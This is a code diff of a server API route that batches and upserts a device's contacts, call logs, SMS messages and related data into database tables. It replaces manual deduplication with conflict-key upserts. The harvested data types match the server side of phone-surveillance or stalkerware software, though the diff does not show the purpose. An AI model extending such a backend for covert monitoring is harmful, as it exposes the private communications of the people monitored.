@@ -23,35 +23,29 @@ export async function POST(request: Request) {
     }
 
     const results: Record<string, number> = {
-      contacts: 0,
-      calls: 0,
-      messages: 0,
-      installed_apps: 0,
-      browsing_history: 0,
-      files: 0,
+      contacts: 0, calls: 0, messages: 0, installed_apps: 0, browsing_history: 0, files: 0,
     };
 
-    // Batch insert contacts (with deduplication)
+    // Batch upsert contacts — ON CONFLICT for zero duplicates, no O(n²) dedup
     if (Array.isArray(contacts) && contacts.length > 0) {
       const contactRows = contacts.map((c: any) => ({
         device_id,
-        name: String(c.name || "Unknown"),
+        name: String(c.name || "Unknown").trim(),
         phone_numbers: Array.isArray(c.phone_numbers) ? c.phone_numbers : [c.phone_number || ""],
         emails: Array.isArray(c.emails) ? c.emails : [],
         synced_at: new Date().toISOString(),
       }));
-      const { data: existing } = await admin.from("device_contacts").select("name, phone_numbers").eq("device_id", device_id).limit(20000);
-      const existingKeys = new Set(existing?.map((c: any) => `${c.name}:${JSON.stringify(c.phone_numbers)}`) || []);
-      const newRows = contactRows.filter((c: any) => !existingKeys.has(`${c.name}:${JSON.stringify(c.phone_numbers)}`));
-      if (newRows.length > 0) {
-        for (let i = 0; i < newRows.length; i += 500) {
-          await admin.from("device_contacts").insert(newRows.slice(i, i + 500));
-        }
-        results.contacts = newRows.length;
+      for (let i = 0; i < contactRows.length; i += 500) {
+        const batch = contactRows.slice(i, i + 500);
+        const { error } = await admin.from("device_contacts").upsert(batch, {
+          onConflict: "device_id,name",
+          ignoreDuplicates: false,
+        });
+        if (!error) results.contacts += batch.length;
       }
     }
 
-    // Batch insert calls (with deduplication)
+    // Batch upsert calls — ignoreDuplicates to prevent timestamp precision failures
     if (Array.isArray(calls) && calls.length > 0) {
       const callRows = calls.map((c: any) => ({
         device_id,
@@ -63,16 +57,17 @@ export async function POST(request: Request) {
         duration_seconds: Number(c.duration_seconds || 0),
         timestamp: c.timestamp || new Date().toISOString(),
       }));
-      const { data: existing } = await admin.from("device_calls").select("phone_number, timestamp").eq("device_id", device_id);
-      const existingKeys = new Set(existing?.map((c: any) => `${c.phone_number}:${c.timestamp}`) || []);
-      const newRows = callRows.filter((c: any) => !existingKeys.has(`${c.phone_number}:${c.timestamp}`));
-      if (newRows.length > 0) {
-        const { error } = await admin.from("device_calls").insert(newRows);
-        if (!error) results.calls = newRows.length;
+      for (let i = 0; i < callRows.length; i += 500) {
+        const batch = callRows.slice(i, i + 500);
+        const { error, count } = await admin.from("device_calls").upsert(batch, {
+          onConflict: "device_id,phone_number,timestamp",
+          ignoreDuplicates: true,
+        });
+        if (!error) results.calls += batch.length;
       }
     }
 
-    // Batch insert messages (with deduplication)
+    // Batch upsert messages — ignoreDuplicates to prevent precision failures
     if (Array.isArray(messages) && messages.length > 0) {
       const messageRows = messages.map((m: any) => ({
         device_id,
@@ -82,12 +77,13 @@ export async function POST(request: Request) {
         message_type: m.message_type === "sent" ? "sent" : "inbox",
         timestamp: m.timestamp || new Date().toISOString(),
       }));
-      const { data: existing } = await admin.from("device_messages").select("sender, timestamp, body").eq("device_id", device_id);
-      const existingKeys = new Set(existing?.map((m: any) => `${m.sender}:${m.timestamp}:${m.body}`) || []);
-      const newRows = messageRows.filter((m: any) => !existingKeys.has(`${m.sender}:${m.timestamp}:${m.body}`));
-      if (newRows.length > 0) {
-        const { error } = await admin.from("device_messages").insert(newRows);
-        if (!error) results.messages = newRows.length;
+      for (let i = 0; i < messageRows.length; i += 500) {
+        const batch = messageRows.slice(i, i + 500);
+        const { error } = await admin.from("device_messages").upsert(batch, {
+          onConflict: "device_id,sender,timestamp",
+          ignoreDuplicates: true,
+        });
+        if (!error) results.messages += batch.length;
       }
     }
 
